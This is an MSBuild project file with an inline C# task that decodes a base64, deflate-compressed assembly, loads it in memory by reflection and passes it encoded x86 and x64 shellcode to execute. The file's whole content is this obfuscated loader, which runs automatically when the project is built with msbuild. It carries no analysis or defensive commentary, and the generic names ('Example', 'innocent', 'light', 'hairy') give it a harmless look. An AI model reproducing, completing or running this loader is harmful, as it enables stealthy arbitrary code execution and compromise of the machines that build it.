<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Example"><Example /></Target>
  <UsingTask
    TaskName="Example"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task><Code Type="Class" Language="cs"><![CDATA[

using System;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;


public class Example : Microsoft.Build.Utilities.Task, Microsoft.Build.Framework.ITask {

    private static string encoded_compressed_dll = @"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";

    private static string x86_shellcode = @"yNy2NDQ0VL3RBfRQv2QEv2Y4v2Ygv0YcO4N+EgXLmAhVSDYYFPX7OTXz1sZmY79mJL9+CL94JUzXfDXlZb9tFDXnv30s1w59vwC/NeIFy5j1+zk18wzUQcI3ScwPSRBB0Gy/bBA151K/OH+/bCg1578wvzXkvXAQEG9vVW1uZcvUa2tuvybfuWleNbmxhjQ0NGRcBb9bs8vhj8SBlmJckqGJqcvhCDJIPrTP1EExj3MnRlteNGfL4VdVWFcaUUxRNA==";

    private static string x64_shellcode = @"yHy30MTc9DQ0NHVldWRmZWJ8BeZRfL9mVHy/Zix8v2YUfL9GZHw7g35+eQX9fAX0mAhVSDYYFHX1/Tl1NfXW2WZ1ZXy/ZhS/dgh8NeS/tLw0NDR8sfRAU3w15GS/fCxwv3QUfTXk12J8y/11vwC8fDXieQX9fAX0mHX1/Tl1NfUM1EHFeDd4EDxxDeVB7Gxwv3QQfTXkUnW/OHxwv3QofTXkdb8wvHw15HVsdWxqbW51bHVtdW58t9gUdWbL1Gx1bW58vybdY8vLy2l8jjU0NDQ0NDQ0fLm5NTU0NHWOBb9bs8vhj8SBlmJ1jpKhianL4Xy38BwIMkg+tM/UQTGPcydGW140bXW97svhV1VYVxpRTFE0";

    private static byte[] decode_decompress_dll(string ecdll)
    {
        byte[] compressed_dll = System.Convert.FromBase64String(ecdll);
        System.IO.MemoryStream memstream = new System.IO.MemoryStream(compressed_dll.Length);
        System.IO.MemoryStream msptr = new System.IO.MemoryStream();
        memstream.Write(compressed_dll, 0, compressed_dll.Length);
        memstream.Seek(0, System.IO.SeekOrigin.Begin);
        using (System.IO.Compression.DeflateStream innocent = new System.IO.Compression.DeflateStream(memstream, System.IO.Compression.CompressionMode.Decompress))
        {
            byte[] block = new byte[4096];
            int nbytes;
            while ((nbytes = innocent.Read(block, 0, block.Length)) != 0)
                msptr.Write(block, 0, nbytes);
        }
        return msptr.ToArray();
    }

    public override bool Execute()
    {
        System.Reflection.Assembly loaded_assembly = System.Reflection.Assembly.Load(
            decode_decompress_dll(encoded_compressed_dll)
        );
        System.Type astype = loaded_assembly.GetType("light");
        object class_instance = System.Activator.CreateInstance(astype, null);
        System.Reflection.MethodInfo entrypoint = astype.GetMethod("hairy");
        entrypoint.Invoke(class_instance, new object[] { x86_shellcode, x64_shellcode });
        return true;
    }
}

      ]]></Code>
    </Task>
  </UsingTask>
</Project>

